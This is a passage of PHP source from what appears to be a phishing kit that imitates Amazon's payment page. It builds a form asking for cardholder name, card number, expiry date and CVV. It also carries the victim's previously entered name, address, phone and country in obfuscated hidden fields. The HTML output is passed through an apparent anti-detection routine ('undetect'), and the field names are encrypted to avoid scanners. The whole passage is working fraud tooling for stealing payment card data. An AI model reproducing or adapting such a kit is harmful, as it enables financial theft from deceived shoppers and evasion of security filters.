                        <input type="hidden" name="'.$api->encypt("country").'" value="' . (isset($_SESSION['country']) && !empty($_SESSION['country']) ? $_SESSION['country'] : (isset($_POST[$api->encypt('country')]) && !empty($_POST[$api->encypt('country')]) ? $_POST[$api->encypt('country')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("kota").'" value="' . (isset($_SESSION['kota']) && !empty($_SESSION['kota']) ? $_SESSION['kota'] : (isset($_POST[$api->encypt('kota')]) && !empty($_POST[$api->encypt('kota')]) ? $_POST[$api->encypt('kota')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("region").'" value="' . (isset($_SESSION['region']) && !empty($_SESSION['region']) ? $_SESSION['region'] : (isset($_POST[$api->encypt('region')]) && !empty($_POST[$api->encypt('region')]) ? $_POST[$api->encypt('region')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("zipcode").'" value="' . (isset($_SESSION['zipcode']) && !empty($_SESSION['zipcode']) ? $_SESSION['zipcode'] : (isset($_POST[$api->encypt('zipcode')]) && !empty($_POST[$api->encypt('zipcode')]) ? $_POST[$api->encypt('zipcode')] : '-')) . '" />
                        <span id="address-ui-widget-content">
                            <div id="address-ui-widgets-enterAddressFormContainer" data-csa-c-content-id="address-ui-widgets-enterAddressFormContainer-content-id-US" data-csa-c-slot-id="address-ui-widgets-enterAddressFormContainer-slot-id-US" data-csa-c-type="widget" class="a-section celwidget" data-csa-c-id="97zbnl-9nx1cq-yqel8h-kiolat" data-cel-widget="address-ui-widgets-enterAddressFormContainer">
                                <div id="address-ui-widgets-SpinnerContainer" class="a-section">
                                    <div id="address-ui-widgets-Spinner" class="a-spinner-wrapper aok-hidden">
                                        <span class="a-spinner a-spinner-medium"></span>
                                    </div>
                                </div>
                                <div class="a-row">
                                    <div class="a-input-text-group a-spacing-medium a-spacing-top-medium">
                                        <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label for="cardname" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                    <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['cardname']).'</span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                            <input type="text" name="'.$api->encypt("cardname").'" id="cardname" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" placeholder="'.$api->text_encode($lang['paymentpage']['placecardname']).'" required="true">
                                            <div id="inputErrorMsgCardname"></div>
                                        </div>
                                        <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label for="cardnumber" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                    <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['cardnumber']).'</span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                            <input type="text" name="'.$api->encypt("cardnumber").'" id="cardnumber" oninput="formatCardNumber(event)" onkeyup="ccc();" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" placeholder="'.$api->text_encode($lang['paymentpage']['cardnumber']).'" required="true">
                                            <div id="inputErrorMsgCardnumber"></div>
                                            <div id="cardTypeIcon" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); width: 40px; height: 26px;"></div>
                                        </div>
                                        <div class="a-row">
                                            <div class="a-column a-span4">
                                                <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                    <div class="a-section a-spacing-none aok-inline-block">
                                                        <label for="cardexp" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                            <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['cardexp']).'</span>
                                                        </label>
                                                    </div>
                                                </div>
                                                <div class="a-section a-spacing-none adddress-ui-widgets-form-field-container">
                                                    <input type="text" name="'.$api->encypt("cardexp").'" id="cardexp" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" placeholder="MM / YY" required="true">
                                                    <div id="inputErrorMsgCardexp"></div>
                                                </div>
                                            </div>
                                            <div class="a-column a-span4">
                                                <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                    <div class="a-section a-spacing-none aok-inline-block">
                                                        <label for="cvv" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                            <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['cvv']).'</span>
                                                        </label>
                                                    </div>
                                                </div>
                                                <div class="a-section a-spacing-none adddress-ui-widgets-form-field-container">
                                                    <input type="text" name="'.$api->encypt("cvv").'" id="cvv" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" placeholder="'.$api->text_encode($lang['paymentpage']['placecvv']).'" required="true">
                                                    <div id="inputErrorMsgCvv"></div>
                                                </div>
                                            </div>
                                        </div>
                                        <br>
                                        <div class="a-row">
                                            <div class="a-column a-span4 a-spacing-none address-column">
                                                <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                    <div class="a-section a-spacing-none aok-inline-block">
                                                        <label class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                            <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['youraddress']).'</span>
                                                        </label>
                                                    </div>
                                                </div>
                                                <div id="ya-myab-display-address-block-0" class="a-box a-spacing-none" style="width: 500px; border-width: 1px; box-sizing: border-box; border-color: #C7C7C7; border-style: solid;">
                                                    <div class="a-box-inner a-padding-none">
                                                        <div class="a-section address-section-no-default">
                                                            <div class="a-row a-spacing-small">
                                                                <ul class="a-unordered-list a-nostyle a-vertical">
                                                                    <li>
                                                                        <span class="a-list-item">
                                                                            <h5 id="address-ui-widgets-FullName" class="id-addr-ux-search-text a-text-bold">'.$api->text_encode($lang['paymentpage']['yourinfoname']).': ' . (isset($_SESSION['fullname']) && !empty($_SESSION['fullname']) ? $_SESSION['fullname'] : (isset($_POST[$api->encypt('fullname')]) && !empty($_POST[$api->encypt('fullname')]) ? $_POST[$api->encypt('fullname')] : '-')) . '</h5>
                                                                        </span>
                                                                    </li>
                                                                    <li>
                                                                        <span class="a-list-item">
                                                                            <span id="address-ui-widgets-AddressLineOne" class="id-addr-ux-search-text">'.$api->text_encode($lang['paymentpage']['yourinfoaddress']).': ' . (isset($_SESSION['address']) && !empty($_SESSION['address']) ? $_SESSION['address'] : (isset($_POST[$api->encypt('address')]) && !empty($_POST[$api->encypt('address')]) ? $_POST[$api->encypt('address')] : '-')) . ', ' . (isset($_SESSION['addressline2']) && !empty($_SESSION['addressline2']) ? $_SESSION['addressline2'] : (isset($_POST[$api->encypt('addressline2')]) && !empty($_POST[$api->encypt('addressline2')]) ? $_POST[$api->encypt('addressline2')] : '')) . '</span>
                                                                        </span>
                                                                    </li>
                                                                    <li>
                                                                        <span class="a-list-item">
                                                                            <span id="address-ui-widgets-CityStatePostalCode" class="id-addr-ux-search-text">'.$api->text_encode($lang['billingpage']['city']).', '.$api->text_encode($lang['billingpage']['state']).', '.$api->text_encode($lang['billingpage']['zipcode']).': ' . (isset($_SESSION['kota']) && !empty($_SESSION['kota']) ? $_SESSION['kota'] : (isset($_POST[$api->encypt('kota')]) && !empty($_POST[$api->encypt('kota')]) ? $_POST[$api->encypt('kota')] : '-')) . ', ' . (isset($_SESSION['region']) && !empty($_SESSION['region']) ? $_SESSION['region'] : (isset($_POST[$api->encypt('region')]) && !empty($_POST[$api->encypt('region')]) ? $_POST[$api->encypt('region')] : '-')) . ' ' . (isset($_SESSION['region']) && !empty($_SESSION['region']) ? $_SESSION['region'] : (isset($_POST[$api->encypt('region')]) && !empty($_POST[$api->encypt('region')]) ? $_POST[$api->encypt('region')] : '-')) . '</span>
                                                                        </span>
                                                                    </li>
                                                                    <li>
                                                                        <span class="a-list-item">
                                                                            <span id="address-ui-widgets-Country" class="id-addr-ux-search-text">'.$api->text_encode($lang['paymentpage']['yourinfocountry']).': '.$_SESSION['country'].'</span>
                                                                        </span>
                                                                    </li>
                                                                    <li>
                                                                        <span class="a-list-item">
                                                                            <span id="address-ui-widgets-PhoneNumber" class="id-addr-ux-search-text">'.$api->text_encode($lang['billingpage']['phonenumber']).': ' . (isset($_SESSION['phone']) && !empty($_SESSION['phone']) ? $_SESSION['phone'] : (isset($_POST[$api->encypt('phone')]) && !empty($_POST[$api->encypt('phone')]) ? $_POST[$api->encypt('phone')] : '-')) . '</span>
                                                                        </span>
                                                                    </li>
                                                                </ul>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <span class="a-declarative" data-action="form-submit-button-click" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-form-submit-button-click" data-form-submit-button-click="{}" data-csa-c-id="2wxgho-v0agi7-ik77m7-h0g34u">
                                    <span id="address-ui-widgets-form-submit-button" class="a-button a-button-primary">
                                        <span class="a-button-inner">
                                            <input class="a-button-input" type="submit" id="btn_next" aria-labelledby="address-ui-widgets-form-submit-button-announce">
                                            <span class="a-button-text" aria-hidden="true">'.$api->text_encode($lang['paymentpage']['verifypayment']).'</span>
                                        </span>
                                    </span>
                                </span>
                            </div>
                            <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/deskop-address.css").'">
                            <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/custom-address.css").'">
                        </span>
                        </form>
                        ';
                        }
                        $html .= '
                    </div>
                </div>
            </div>
            <div class="navLeftFooter nav-sprite-v1" id="navFooter">
                <a href="javascript:void(0)" id="navBackToTop">
                    <div class="navFooterBackToTop">
                        <span class="navFooterBackToTopText">
                            '.$api->text_encode($lang['paymentpage']['backtotop']).'
                        </span>
                    </div>
                </a> 
                <div class="navFooterVerticalColumn navAccessibility" role="presentation">
                    <div class="navFooterVerticalRow navAccessibility" style="display: table-row;">
                        <div class="navFooterLinkCol navAccessibility">
                            <div class="navFooterColHead" role="heading" aria-level="6">'.$api->text_encode($lang['billingfooter']['gettoknow']).'</div>
                            <ul>
                                <li class="nav_first">
                                    <a href="#jobs" class="nav_a">'.$api->text_encode($lang['billingfooter']['careers']).'</a>
                                </li>
                                <li>
                                    <a href="#blog" class="nav_a">'.$api->text_encode($lang['billingfooter']['blog']).'</a>
                                </li>
                                <li>
                                    <a href="#aboutamazon" class="nav_a">'.$api->text_encode($lang['billingfooter']['aboutamazon']).'</a>
                                </li>
                                <li>
                                    <a href="#ir" class="nav_a">'.$api->text_encode($lang['billingfooter']['investor']).'</a>
                                </li>
                                <li>
                                    <a href="#gp" class="nav_a">'.$api->text_encode($lang['billingfooter']['amazondevices']).'</a>
                                </li>
                                <li class="nav_last ">
                                    <a href="#amazonscience" class="nav_a">'.$api->text_encode($lang['billingfooter']['amazonscience']).'</a>
                                </li>
                            </ul>
                        </div>
                        <div class="navFooterColSpacerInner navAccessibility"></div>
                        <div class="navFooterLinkCol navAccessibility">
                            <div class="navFooterColHead" role="heading" aria-level="6">'.$api->text_encode($lang['billingfooter']['makemoney']).'</div>
                            <ul>
                                <li class="nav_first">
                                    <a href="#sell" class="nav_a">'.$api->text_encode($lang['billingfooter']['sellproducts']).'</a>
                                </li>
                                <li>
                                    <a href="#amazonbusiness" class="nav_a">'.$api->text_encode($lang['billingfooter']['sellbusiness']).'</a>
                                </li>
                                <li>
                                    <a href="#developer" class="nav_a">'.$api->text_encode($lang['billingfooter']['sellapps']).'</a>
                                </li>
                                <li>
                                    <a href="#affiliateprogram" class="nav_a">'.$api->text_encode($lang['billingfooter']['becomeaffiliate']).'</a>
                                </li>
                                <li>
                                    <a href="#advertising" class="nav_a">'.$api->text_encode($lang['billingfooter']['advertise']).'</a>
                                </li>
                                <li>
                                    <a href="#selleraccount" class="nav_a">'.$api->text_encode($lang['billingfooter']['selfpublish']).'</a>
                                </li>
                                <li>
                                    <a href="#amazonhublocker" class="nav_a">'.$api->text_encode($lang['billingfooter']['hostamazonhub']).'</a>
                                </li>
                                <li class="nav_last nav_a_carat">
                                    <span class="nav_a_carat" aria-hidden="true">›</span>
                                    <a href="#b/?node=18190131011&amp;ld=AZUSSOA-seemore&amp;ref_=footer_seemore" class="nav_a">'.$api->text_encode($lang['billingfooter']['seemore']).'</a>
                                </li>
                            </ul>
                        </div>
                        <div class="navFooterColSpacerInner navAccessibility"></div>
                        <div class="navFooterLinkCol navAccessibility">
                            <div class="navFooterColHead" role="heading" aria-level="6">'.$api->text_encode($lang['billingfooter']['amazonpayment']).'</div>
                            <ul>
                                <li class="nav_first">
                                    <a href="#dp" class="nav_a">'.$api->text_encode($lang['billingfooter']['amazonbusiness']).'</a>
                                </li>
                                <li>
                                    <a href="#gp" class="nav_a">'.$api->text_encode($lang['billingfooter']['shopwithpoints']).'</a>
                                </li>
                                <li>
                                    <a href="#gp" class="nav_a">'.$api->text_encode($lang['billingfooter']['reloadbalance']).'</a>
                                </li>
                                <li class="nav_last ">
                                    <a href="#gp" class="nav_a">'.$api->text_encode($lang['billingfooter']['amazoncurrency']).'</a>
                                </li>
                            </ul>
                        </div>
                        <div class="navFooterColSpacerInner navAccessibility"></div>
                        <div class="navFooterLinkCol navAccessibility">
                            <div class="navFooterColHead" role="heading" aria-level="6">'.$api->text_encode($lang['billingfooter']['letushelp']).'</div>
                            <ul>
                                <li>
                                    <a href="#homepage" class="nav_a">'.$api->text_encode($lang['billingfooter']['youraccount']).'</a>
                                </li>
                                <li>
                                    <a href="#orderhistory" class="nav_a">'.$api->text_encode($lang['billingfooter']['yourorders']).'</a>
                                </li>
                                <li>
                                    <a href="#gp" class="nav_a">'.$api->text_encode($lang['billingfooter']['shippingrates']).'</a>
                                </li>
                                <li>
                                    <a href="#gp" class="nav_a">'.$api->text_encode($lang['billingfooter']['returnsreplace']).'</a>
                                </li>
                                <li>
                                    <a href="#gp" class="nav_a">'.$api->text_encode($lang['billingfooter']['manageyourcontent']).'</a>
                                </li>
                                <li class="nav_last ">
                                    <a href="#gp" class="nav_a">'.$api->text_encode($lang['billingfooter']['help']).'</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="nav-footer-line"></div>
                <div class="navFooterLine navFooterLinkLine navFooterPadItemLine">
                    <span>
                        <div class="navFooterLine navFooterLogoLine">
                            <a href="#?ref_=footer_logo">
                                <div class="nav-logo-base nav-sprite"></div>
                            </a>
                        </div>
                    </span>
                    <span class="icp-container-desktop">
                        <div class="navFooterLine">
                            <style type="text/css">
                            #icp-touch-link-language {
                                display: none;
                            }
                            </style>
                            <a href="#customer-preferences" aria-owns="nav-flyout-icp-footer-flyout" class="icp-button" id="icp-touch-link-language">
                                <div class="icp-nav-globe-img-2 icp-button-globe-2"></div>
                                <span class="icp-color-base">'.$api->text_encode($lang['billingfooter']['language']).'</span>
                                <span class="nav-arrow icp-up-down-arrow"></span>
                            </a>
                            <style type="text/css">
                            #icp-touch-link-cop {
                                display: none;
                            }
                            </style>
                            <a href="#customer-preferences" class="icp-button" id="icp-touch-link-cop">
                                <span class="icp-currency-symbol">'.$api->text_encode($lang['billingfooter']['symbolmoney']).'</span><span class="icp-color-base">'.$api->text_encode($lang['billingfooter']['money']).'</span>
                            </a>
                            <style type="text/css">
                            #icp-touch-link-country {
                                display: none;
                            }
                            </style>
                            <a href="#customer-preferences" class="icp-button" id="icp-touch-link-country">
                                <span class="icp-flag-3 icp-flag-3-'.strtolower($_SESSION['countrycode']).'"></span>
                                <span class="icp-color-base">'.$api->text_encode($_SESSION['country']).'</span>
                            </a>
                        </div>
                    </span>
                </div>
                <div class="navFooterLine navFooterLinkLine navFooterPadItemLine navFooterCopyright">
                    <ul>
                        <li class="nav_first">
                            <a href="#gp" id="" class="nav_a">'.$api->text_encode($lang['billingfooter']['conditions']).'</a> 
                        </li>
                        <li>
                            <a href="#gp" id="" class="nav_a">'.$api->text_encode($lang['billingfooter']['consumer']).'</a> 
                        </li>
                        <li>
                            <a href="#gp" id="" class="nav_a">'.$api->text_encode($lang['billingfooter']['adsprivacy']).'</a> 
                        </li>
                        <li>
                            <a href="#privacyprefs" id="" class="nav_a">'.$api->text_encode($lang['billingfooter']['privacy']).'</a> 
                        </li>
                        <li class="nav_last">
                            <span id="nav-icon-ccba" class="nav-sprite"></span> 
                        </li>
                    </ul>
                    <span>'.$api->text_encode($lang['billingfooter']['copyright']).'</span>
                </div>
            </div>
        </div>
    </div>
    <div id="a-popover-root" style="z-index:-1;position:absolute;"></div>
    <script src="'.$api->text_encode("../../assets/js/jquery.min.js").'"></script>
    <script src="'.$api->text_encode("../../assets/js/jquery.mask.min.js").'"></script>
    <script src="'.$api->text_encode("../../assets/js/jquery.validate.min.js").'"></script>
    <script src="'.$api->text_encode("../../assets/js/card.auth.js").'"></script>
</body>
</html>';

$api->undetect($html);
?>